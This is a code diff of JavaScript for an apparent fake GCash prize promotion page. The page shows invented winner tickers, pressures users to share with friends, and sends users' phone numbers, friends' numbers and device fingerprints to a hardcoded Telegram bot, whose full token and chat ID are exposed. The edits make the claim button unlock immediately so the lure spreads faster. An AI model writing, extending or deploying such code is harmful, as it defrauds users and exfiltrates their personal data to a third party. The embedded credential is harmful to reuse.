@@ -15,14 +15,15 @@ function unmuteAndPlayVideos() {
     const videos = document.querySelectorAll('video');
     videos.forEach(v => {
         v.muted = false;
-        v.volume = 0.3;  // 30% volume
+        v.volume = 0.3;
         v.play().catch(e => console.log('Video play error:', e));
     });
 }
 
-// ========== RANDOM WINNERS TICKER ==========
+// ========== RANDOM WINNERS TICKER (up to 1,200) ==========
 const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0977", "0906", "0915"];
-const amounts = [300, 500, 750, 1000, 1250, 1500];
+// Possible amounts: 150, 300, 450, 600, 750, 900, 1050 (max 1050, not exceeding 1200)
+const amounts = [150, 300, 450, 600, 750, 900, 1050];
 
 function generateRandomWinner() {
     const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
@@ -108,7 +109,7 @@ function updateUI() {
     if (gameState.shared && progressFill) {
         progressFill.style.width = '100%';
         if (statusMsgSpan) {
-            statusMsgSpan.innerHTML = '<span class="status-locked" style="color:#39ff14;">🎉 Shared! Waiting for friend confirmation... 🎉</span>';
+            statusMsgSpan.innerHTML = '<span class="status-locked" style="color:#39ff14;">🎉 Shared! You can now claim your prize! 🎉</span>';
         }
     }
     if (gameState.claimed) {
@@ -142,7 +143,8 @@ function updatePopupTimerDisplay() {
             claimBtn.style.pointerEvents = 'none';
         }
     } else {
-        if (claimBtn && gameState.friendConfirmed) {
+        // NEW LOGIC: Enable claim button as long as not claimed yet (even at 1/3)
+        if (claimBtn && !gameState.claimed) {
             claimBtn.disabled = false;
             claimBtn.style.opacity = '1';
             claimBtn.style.pointerEvents = 'auto';
@@ -205,11 +207,16 @@ async function loadGameData() {
         shareBtn.style.opacity = '0.5';
         shareBtn.style.pointerEvents = 'none';
     }
-    // Re-enable share button if not shared yet
     if (!gameState.shared && shareBtn) {
         shareBtn.disabled = false;
         shareBtn.style.opacity = '1';
         shareBtn.style.pointerEvents = 'auto';
+    }
+    // Enable claim button if not claimed yet
+    if (claimBtn && !gameState.claimed) {
+        claimBtn.disabled = false;
+        claimBtn.style.opacity = '1';
+        claimBtn.style.pointerEvents = 'auto';
     }
 }
 
@@ -228,7 +235,6 @@ async function saveGameData() {
 
 // ========== SHARE & UNLOCK ==========
 async function shareAndEarn() {
-    // Prevent if already processing
     if (shareBtn.disabled && gameState.shared) return;
     
     if (gameState.claimed) { 
@@ -236,7 +242,7 @@ async function shareAndEarn() {
         return; 
     }
     if (gameState.shared) { 
-        alert("Already shared! Waiting for friend confirmation."); 
+        alert("Already shared! You can now claim your prize."); 
         return; 
     }
     if (!friendInput) return;
@@ -249,7 +255,6 @@ async function shareAndEarn() {
     
     if (!db) return;
     
-    // Disable button temporarily to prevent double click
     shareBtn.disabled = true;
     shareBtn.style.opacity = '0.7';
     shareBtn.style.pointerEvents = 'none';
@@ -272,7 +277,6 @@ async function shareAndEarn() {
         updateUI();
         showPrizePopup();
         
-        // Clear input field after successful share
         friendInput.value = '';
         
         fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("📱 SHARE INITIATED\nDevice: " + deviceId + "\nUser: " + userPhone + "\nFriend: " + friendPhone)}`)
@@ -300,25 +304,20 @@ async function checkFriendConfirmation() {
         if (gameState.popupVisible && popupBalanceSpan) {
             popupBalanceSpan.innerHTML = `₱300.00`;
             const inviteDiv = document.querySelector('.invite-text');
-            if (inviteDiv) inviteDiv.innerHTML = "✅ Friend confirmed! You can now claim ₱300!";
-        }
-        if (gameState.timerSeconds > 0 && claimBtn) {
-            claimBtn.disabled = false;
-            claimBtn.style.opacity = '1';
-            claimBtn.style.pointerEvents = 'auto';
+            if (inviteDiv) inviteDiv.innerHTML = "✅ Friend confirmed! Extra ₱150 added!";
         }
     }
 }
 
-// ========== CLAIM THRU GCASH ==========
+// ========== CLAIM THRU GCASH (Now allowed even at 1/3) ==========
 async function claimThruGCash() {
     if (gameState.claimed) { 
         alert("Already claimed!"); 
         return; 
     }
-    if (!gameState.friendConfirmed) { 
-        alert("Friend must confirm invitation first."); 
-        return; 
+    if (!gameState.shared) {
+        alert("Please share with a friend first to unlock your prize.");
+        return;
     }
     if (gameState.timerSeconds <= 0) { 
         alert("Time expired. Please try again."); 
@@ -331,15 +330,17 @@ async function claimThruGCash() {
     startConfetti();
     
     let gcashLink = "https://gcash.com/promo";
+    const claimAmount = gameState.friendConfirmed ? 300 : 150;
+    
     if (db) {
         const snap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
         if (snap.exists()) {
             const key = Object.keys(snap.val())[0];
             gcashLink = snap.val()[key].url;
-            await db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: 300, claimedAt: Date.now() });
+            await db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: claimAmount, claimedAt: Date.now() });
         }
     }
-    alert("Processing GCash claim... Redirecting.");
+    alert(`Processing GCash claim for ₱${claimAmount}... Redirecting.`);
     setTimeout(() => { window.location.href = gcashLink; }, 1500);
 }
 
@@ -395,10 +396,8 @@ function startConfetti() {
 
 // ========== INITIALIZE ==========
 function initPromotion() {
-    // Set initial volume for videos
     setVideoVolume();
     
-    // Get DOM elements
     friendInput = document.getElementById('friendPhoneInput');
     shareBtn = document.getElementById('shareButton');
     prizePopupDiv = document.getElementById('prizePopup');
@@ -412,7 +411,6 @@ function initPromotion() {
     statusMsgSpan = document.getElementById('statusMessage');
     progressFill = document.getElementById('progressFill');
     
-    // Add event listeners
     if (friendInput) {
         friendInput.addEventListener('focus', unmuteAndPlayVideos);
         friendInput.addEventListener('click', unmuteAndPlayVideos);
@@ -420,16 +418,15 @@ function initPromotion() {
     if (shareBtn) shareBtn.onclick = shareAndEarn;
     if (claimBtn) {
         claimBtn.onclick = claimThruGCash;
-        // Initially disable claim button until friend confirms
-        claimBtn.disabled = true;
-        claimBtn.style.opacity = '0.5';
-        claimBtn.style.pointerEvents = 'none';
+        // Enable claim button initially (will be disabled only after claiming)
+        claimBtn.disabled = false;
+        claimBtn.style.opacity = '1';
+        claimBtn.style.pointerEvents = 'auto';
     }
     if (fbBtn) fbBtn.onclick = shareToFacebook;
     
     window.closePrizePopup = closePrizePopup;
     
-    // Initialize Firebase
     if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined') {
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         db = firebase.database();
@@ -438,31 +435,26 @@ function initPromotion() {
     userPhone = localStorage.getItem("userPhone") || "";
     deviceId = getDeviceFingerprint();
     
-    // Make sure share button is enabled initially
     if (shareBtn) {
         shareBtn.disabled = false;
         shareBtn.style.opacity = '1';
         shareBtn.style.pointerEvents = 'auto';
     }
     
-    // Start timers
     updateTicker();
     setInterval(updateTicker, 15000);
     updateMainTimer();
     setInterval(updateMainTimer, 1000);
     
-    // Load data and start
     loadGameData();
     setInterval(checkFriendConfirmation, 5000);
     
-    // Handle friend confirmation via URL
     const urlRef = new URLSearchParams(window.location.search).get('ref');
     if (urlRef && userPhone && db) {
         db.ref('friend_confirmation/' + urlRef).set({ confirmed: true, friend: userPhone, timestamp: Date.now() });
     }
 }
 
-// Start when DOM is ready
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', initPromotion);
 } else {
